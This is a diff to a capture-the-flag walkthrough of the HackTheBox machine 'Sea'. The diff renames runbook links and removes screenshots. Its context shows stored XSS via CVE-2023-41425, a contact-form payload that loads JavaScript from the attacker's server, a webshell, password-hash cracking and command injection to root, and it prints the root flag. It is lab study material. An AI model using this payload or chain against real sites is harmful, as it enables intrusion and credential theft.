@@ -12,7 +12,7 @@ status: Complete
 
 ## The gist
 
-Sea is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[RUNBOOK V2/Linux - Web Enum]] identified the application and the administrator workflow. 2. [[RUNBOOK V2/Linux - Stored XSS]] used the contact form to make the administrator browser request attacker-controlled JavaScript. 3. [[RUNBOOK V2/Linux - File Upload]] converted that browser action into a theme upload and a webshell foothold. 4. [[RUNBOOK V2/Linux - Command Injection]] reached the loopback-only monitor and executed a privileged command.
+Sea is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[OSCP/RUNBOOK V2/Linux - Web Enum]] identified the application and the administrator workflow. 2. [[OSCP/RUNBOOK V2/Linux - Stored XSS]] used the contact form to make the administrator browser request attacker-controlled JavaScript. 3. [[OSCP/RUNBOOK V2/Linux - File Upload]] converted that browser action into a theme upload and a webshell foothold. 4. [[OSCP/RUNBOOK V2/Linux - Command Injection]] reached the loopback-only monitor and executed a privileged command.
 
 ## Box information
 
@@ -65,7 +65,6 @@ Open ports:
 | 22/tcp | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 |
 | 80/tcp | Apache 2.4.41 (sea.htb) |
 
-![](<file:///home/kali/Platforms/Offsec/Nukem/screenshots/1.1.nmap-allports.png>)
 
 **Service scan:**
 ```bash
@@ -76,7 +75,6 @@ Key findings:
 - Port 22: OpenSSH 8.2p1, no low-hanging auth issues.
 - Port 80: Apache 2.4.41, virtual host `sea.htb` surfaced. Add to `/etc/hosts` before continuing.
 
-![](<file:///home/kali/Platforms/Offsec/Cockpit/screenshots/1.2nmap-svcscan.png>)
 
 **/etc/hosts entry:**
 ```bash
@@ -101,7 +99,6 @@ curl -s http://sea.htb/themes/bike/version
 
 Output: `3.2.0`
 
-![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/2.2enum-theme-vers.png>)
 
 WonderCMS `bike` theme version 3.2.0 confirmed. This maps to a known CVE.
 
@@ -158,7 +155,6 @@ cp /usr/share/exploitdb/exploits/php/webapps/52271.py exploits/
 > ```
 > **Why:** This copies the matching exploit directly and removes a long path lookup. Read the file before running it so the exploit logic remains clear.
 
-![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/3.searchspoloit.png>)
 
 **CVE-2023-41425**: The contact form stores the website URL without sanitisation. When an admin views the messages panel, the stored payload executes. The exploit chain is:
 1. XSS reads the admin's CSRF token from the DOM
@@ -210,7 +206,6 @@ Expected: entry is `malicious/malicious.php`, not a bare `malicious.php`. A flat
 > [!tip] ⚡ Efficiency
 > Inspect the archive locally before waiting for the bot. This catches the most common installation failure immediately and avoids treating a correct XSS as broken when the theme package is malformed.
 
-![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/4.malicious-zip.png>)
 
 ### Step 3: Start HTTP Server
 
@@ -233,7 +228,6 @@ curl -s -X POST http://sea.htb/contact.php \
   -d "name=test&email=test@test.com&website=http://sea.htb/index.php?page=loginURL?%22%3E%3C/form%3E%3Cscript+src=%22http://$LocalIP:8000/malicious.js%22%3E%3C/script%3E%3Cform+action=%22&message=test"
 ```
 
-![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/3.1xss-payload.png>)
 
 ### Step 5: Wait for Admin Bot
 
@@ -245,7 +239,6 @@ The admin bot checks the messages panel on a timer. Watch your HTTP server outpu
 > [!tip] 🛠️ Alternative tools
 > Burp Collaborator or another controlled callback service can confirm the browser-side request, but a local HTTP server is enough when the target can reach the lab VPN address.
 
-![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/4.1xss-callback.png>)
 
 ### Step 6: Verify Webshell
 
@@ -259,7 +252,6 @@ Output:
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/5.footholod.png>)
 
 ### Step 7: Reverse Shell
 
@@ -303,7 +295,6 @@ ls /var/www/sea/data/
 cat /var/www/sea/data/database.js
 ```
 
-![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/7.database-hash.png>)
 
 ### Extract and Save Hash
 
@@ -330,7 +321,6 @@ hashcat -m 3200 loot/hash.txt /usr/share/wordlists/rockyou.txt
 
 Result stored privately in the credential loot.
 
-![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/2026-08-28_11-2.png>)
 
 ```
 boxset Password $Password
@@ -352,7 +342,6 @@ ssh amay@$BoxIP
 cat ~/user.txt
 ```
 
-![](<file:///home/kali/Platforms/HackTheBox/Poison/screenshots/9.user-flag.png>)
 
 `loot flag user <value>`
 
@@ -368,7 +357,6 @@ ss -tlnp
 
 Output includes: `127.0.0.1:8080` bound only to loopback. Not reachable from outside.
 
-![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/10.privesc-finding.png>)
 
 ### Tunnel to Internal Service
 
@@ -397,7 +385,6 @@ curl -s -u amay:$Password http://localhost:8888/
 
 Authenticated. The app is "**System Monitor (Developing)**": a custom PHP admin panel showing disk usage and a set of forms. The key one is "**Analyze Log File**", which POSTs two parameters: `log_file` (a file path) and `analyze_log` (submit button). The path is almost certainly passed to a shell command server-side.
 
-![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/10.1privesc-finding2.png>)
 
 ### Command Injection via log_file
 
@@ -425,7 +412,6 @@ uid=0(root) gid=0(root) groups=0(root)
 FOUND_PROOF
 ```
 
-![](<file:///home/kali/Platforms/HackTheBox/Sea/screenshots/10.2.privesc-exploit.png>)
 
 ### Root Flag
 
@@ -436,7 +422,6 @@ curl -sS -u "amay:$Password" \
   http://127.0.0.1:8080/ | grep -oP '[a-f0-9]{32}'
 ```
 
-![](<file:///home/kali/Platforms/HackTheBox/SwagShop/screenshots/11.root-flag.png>)
 
 `loot flag root <value>`
 
@@ -571,10 +556,10 @@ Practice these if you want to drill the same techniques:
 
 ## 16. RUNBOOK V2 Stages Used
 
-- [[RUNBOOK V2/Linux - Web Enum]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Linux - Stored XSS]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Linux - File Upload]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Linux - Command Injection]] -- technique used in this walkthrough
+- [[OSCP/RUNBOOK V2/Linux - Web Enum]] -- technique used in this walkthrough
+- [[OSCP/RUNBOOK V2/Linux - Stored XSS]] -- technique used in this walkthrough
+- [[OSCP/RUNBOOK V2/Linux - File Upload]] -- technique used in this walkthrough
+- [[OSCP/RUNBOOK V2/Linux - Command Injection]] -- technique used in this walkthrough
 
 ## 17. Collect the flags
 
@@ -597,10 +582,10 @@ root: 9a3b1d56dee59a566bb095bab70acbfa
 Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.
 
 ## 19. Attack narrative in one page
-1. [[RUNBOOK V2/Linux - Web Enum]] identified the application and the administrator workflow.
-2. [[RUNBOOK V2/Linux - Stored XSS]] used the contact form to make the administrator browser request attacker-controlled JavaScript.
-3. [[RUNBOOK V2/Linux - File Upload]] converted that browser action into a theme upload and a webshell foothold.
-4. [[RUNBOOK V2/Linux - Command Injection]] reached the loopback-only monitor and executed a privileged command.
+1. [[OSCP/RUNBOOK V2/Linux - Web Enum]] identified the application and the administrator workflow.
+2. [[OSCP/RUNBOOK V2/Linux - Stored XSS]] used the contact form to make the administrator browser request attacker-controlled JavaScript.
+3. [[OSCP/RUNBOOK V2/Linux - File Upload]] converted that browser action into a theme upload and a webshell foothold.
+4. [[OSCP/RUNBOOK V2/Linux - Command Injection]] reached the loopback-only monitor and executed a privileged command.
 
 ## Tools used
 
@@ -725,12 +710,12 @@ kali@kali:~/Platforms/HackTheBox/Sea [11:38:19] $ [?1h=[?2004hlllolooot
 
 ## Related RUNBOOK V2 stages
 
-- [[RUNBOOK V2/Start Here]]
-- [[RUNBOOK V2/Linux - Service Scan]]
-- [[RUNBOOK V2/Linux - Web Enum]]
-- [[RUNBOOK V2/Linux - Shell Stabilise]]
-- [[RUNBOOK V2/Linux - Local Enum]]
-- [[RUNBOOK V2/Linux - Clean Down]]
+- [[OSCP/RUNBOOK V2/Start Here]]
+- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
+- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
+- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
+- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
+- [[OSCP/RUNBOOK V2/Linux - Clean Down]]
 
 ## Why this matters for OSCP
 
